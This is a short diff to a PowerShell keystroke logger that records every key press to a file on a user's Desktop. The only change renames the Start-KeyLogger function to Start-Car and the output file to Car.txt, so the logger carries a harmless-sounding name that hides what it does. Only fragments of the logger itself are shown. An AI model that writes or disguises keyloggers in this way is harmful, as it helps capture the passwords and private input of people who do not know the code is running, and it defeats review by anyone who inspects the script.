@@ -5,7 +5,7 @@ $RunTimeP = 1
 $TimeStart = Get-Date
 $TimeEnd = $timeStart.addminutes($RunTimeP)
 #requires -Version 2
-function Start-KeyLogger($Path="C:\Users\atuna\Desktop\keylogger.txt") 
+function Start-Car($Path="C:\Users\atuna\Desktop\Car.txt") 
 {
   # Signatures for API Calls
   $signatures = @'
@@ -78,4 +78,4 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
 # records all key presses until script is aborted by pressing CTRL+C
 # will then open the file with collected key codes
-Start-KeyLogger
+Start-Car
